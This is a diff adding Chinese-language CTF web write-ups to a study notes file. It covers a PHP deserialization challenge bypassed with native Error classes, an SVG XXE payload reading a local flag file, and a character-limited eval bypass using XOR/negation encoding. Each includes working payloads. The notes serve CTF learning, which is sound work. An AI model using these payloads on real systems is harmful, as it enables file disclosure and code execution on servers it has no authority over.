@@ -1356,6 +1356,111 @@ so:
 
     payload: `file=phar://upload/xxxx.jpg`,得到的内容base64解码
 
+### 类型五-原生类利用
+
+#### 极客大挑战 2020 Greatphp
+
+##### 考点
+
+**PHP原生类利用**
+
+**php反序列化**
+
+**md5()和sha1()对类进行hash 触发__toString方法**
+
+##### 过程
+
+1. 源码
+
+    ```php
+    <?php
+    error_reporting(0);
+    class SYCLOVER {
+        public $syc;
+        public $lover;
+    
+        public function __wakeup(){
+            if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
+                if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
+                    eval($this->syc);
+                } else {
+                    die("Try Hard !!");
+                }
+            }
+        }
+    }
+    if (isset($_GET['great'])){
+        unserialize($_GET['great']);
+    } else {
+        highlight_file(__FILE__);
+    }
+    ?>
+    ```
+    代码中第一个if判断要求原字符串不一样，加密后的密文一样，如果不是在类里面可以直接用数组绕过
+
+    在类里面的话，我们可以使用含有 __toString 方法的php内置类来绕过，用的两个比较多的内置类是 Exception 和Error ，他们之中有一个 __toString 方法,当类被当作字符串处理时，就会调用这个函数，以Error 类为例，我们可控当触发他的__toString 方法时
+    
+    ```php
+    <?php
+    $a = new Error("payload",'9');
+    echo $a;
+    ```
+    输出
+
+    ```cmd
+    F:\ProgramFiles\php-8.3.4\php.exe D:\desktop\ctf\buu\web\script\php\test.php
+    Error: payload in D:\desktop\ctf\buu\web\script\php\test.php:3
+    Stack trace:
+    #0 {main}
+    进程已结束，退出代码为 0
+    ```
+
+    会以字符串的形式输出当前报错，包含当前的错误信息，以及他出现错误的行号 3，从而传入Error ("payload",9)中的错误代码 '9' 则没有被输出出来,再来看看如何 绕过md5以及 sha1
+
+    ```php
+    <?php
+    $a = new Error("payload",'9'); $b = new Error("payload",'0');
+    if(md5($a) === md5($b)){
+        echo "md5相等" . "\n";
+    }
+
+    if(sha1($a) === sha1($b)){
+        echo "sha1相等" . "\n";
+    }
+    ```
+
+    输出：
+    ```cmd
+    F:\ProgramFiles\php-8.3.4\php.exe D:\desktop\ctf\buu\web\script\php\test.php
+    md5相等
+    sha1相等
+    ```
+
+    由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接include "/flag"将flag包含进来即可；由于过滤了引号，于是在这里进行取反，这样解码后就自动是字符串，无需再加双引号或单引号。
+
+    而且eval执行带有完整标签的语句需要先闭合，就类似于将字符串当成代码写入到源码中。
+
+2. payload:
+
+    ```php
+    <?php
+    class SYCLOVER
+    {
+        public $syc;
+        public $lover;
+    }
+
+    $cmd = '/flag';
+    $s = urlencode(~$cmd);
+    $str = "?><?=include~" . urldecode($s) . "?>";
+    $a = new Error($str, 1);$b = new Error($str, 2);
+    $c = new SYCLOVER();
+    $c->syc = $a;
+    $c->lover = $b;
+    echo(urlencode(serialize($c)));
+    ?>
+    ```
+
 
 ## python反序列化
 
@@ -2492,6 +2597,26 @@ payload:`?exp=print_r(highlight_file(next(array_reverse(scandir(current(localeco
     </users>
     ```
 
+### BSidesCF 2019SVGMagic(SVG+XML)
+
+SVG是一种用XML定义的语言，SVG图形是可交互的和动态的，可以在SVG文件中嵌入动画元素或通过脚本来定义动画。
+
+也就是说这里的SVG是个XML,并且存在可控的内容，那么自然就会想到XXE
+
+构造文件内容
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [
+<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt">
+]>
+<svg height="200" width="1000">
+	<text x="20" y="20">&file;</text>
+</svg>
+```
+
+这里可以通过调整宽度使flag显示完整。
+
 ## BJDCTF2020 Mark loves cat(.git目录泄露+代码审计)
 
 1. 进去之后找不到有用的信息，dirsearch扫描目录，发现.git泄露
@@ -3381,7 +3506,7 @@ payload:
     
     所以此处可以使`username`为想要执行的命令。用bp抓包，会发现响应头中有访问链接，访问之后发现命令成功执行。以这种方式就可以得到flag。
 
-## 无数字字母RCE
+## 无数字字母shell
 
 [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
 
@@ -3691,6 +3816,51 @@ eval($hhh);
     $_($$___[$_]);
     #system($_POST[system]);
     ```
+
+### ISITDTU 2019 EasyPHP(限制字符种数)
+
+#### 源码
+
+    ```php
+    <?php
+    highlight_file(__FILE__);
+
+    $_ = @$_GET['_'];
+    if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
+        die('rosé will not do it');
+
+    if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
+        die('you are so close, omg');
+
+    eval($_);
+    ```
+
+    >count_chars(string,3) 返回一个去重的字符串(所有使用过的不同的字符)长度
+
+    第一个if传入的参数不能包含正则表达式中的字符，可以用取反，异或绕过(没有过滤 ~ 和 ^ )
+
+    第二个if参数中使用的字符种类数不能超过13
+
+### 解题
+
+1. 收集信息
+
+    首先测试一下phpinfo(),这一步通过取反就可以，字符种类数不会超过13，在phpinfo()中发现命令执行的函数都被禁用了
+
+    要获取flag，可以一同scandir()或glob()函数列目录，但它返回一个数组，我们还需要一个print_r或var_dump
+
+    传入的参数
+
+    ```url
+    print_r(scandir('.'));==((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));
+    ```
+    请求发送后第二个if过不去，所用字符数超过限制，需要缩减字符
+
+2. 构造payload
+
+    这里说明一下，取反是没有办法缩减字符种数，因为一个字符经过两次取反还是原子符，而异或不一样，三个字符异或如果等于第四个字符，那么就可以用这三个字符代替第四个字符，从而删去第四个字符。
+
+    [三重异或构造payload](./xor_3s.py)
 
 ## SUCTF2019 Pythonnginx(IDNA编码绕过)
 
